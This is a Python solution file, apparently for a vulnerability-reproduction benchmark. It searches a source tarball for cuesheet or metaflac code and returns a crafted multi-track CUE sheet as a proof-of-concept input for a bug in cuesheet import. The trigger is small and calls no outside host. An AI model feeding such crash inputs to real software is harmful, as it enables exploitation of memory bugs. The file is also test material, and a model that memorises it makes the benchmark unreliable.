import io
import os
import tarfile
from typing import Optional


class Solution:
    def _detect_expected_input_kind(self, src_path: str) -> str:
        """
        Returns:
            "cue" or "unknown"
        """
        # Heuristic: if source contains import-cuesheet or metaflac, likely expects a CUE sheet text as input.
        needles = (
            b"import-cuesheet",
            b"import_cuesheet",
            b"--import-cuesheet-from",
            b"metaflac",
            b"cuesheet",
        )

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    # Scan only plausible text/source files and keep it cheap.
                    name = m.name.lower()
                    if not (
                        name.endswith(".c")
                        or name.endswith(".cc")
                        or name.endswith(".cpp")
                        or name.endswith(".h")
                        or name.endswith(".hpp")
                        or name.endswith(".py")
                        or name.endswith(".sh")
                        or name.endswith(".mk")
                        or name.endswith("makefile")
                        or name.endswith(".cmake")
                        or "fuzz" in name
                        or "fuzzer" in name
                    ):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    for nd in needles:
                        if nd in data:
                            return "cue"
        except Exception:
            pass

        return "unknown"

    def _build_cue_poc(self) -> bytes:
        # Minimal valid-enough cuesheet with multiple tracks to ensure multiple seekpoints are appended.
        # Keep it ASCII and newline-terminated for line-based parsers.
        cue = (
            'FILE "a" WAVE\n'
            "TRACK 01 AUDIO\n"
            "INDEX 01 00:00:00\n"
            "TRACK 02 AUDIO\n"
            "INDEX 01 00:00:01\n"
            "TRACK 03 AUDIO\n"
            "INDEX 01 00:00:02\n"
            "TRACK 04 AUDIO\n"
            "INDEX 01 00:00:03\n"
        )
        return cue.encode("ascii", "strict")

    def solve(self, src_path: str) -> bytes:
        kind = self._detect_expected_input_kind(src_path)
        if kind == "cue":
            return self._build_cue_poc()
        # Fallback: still return the cuesheet PoC, as the described bug is in cuesheet import.
        return self._build_cue_poc()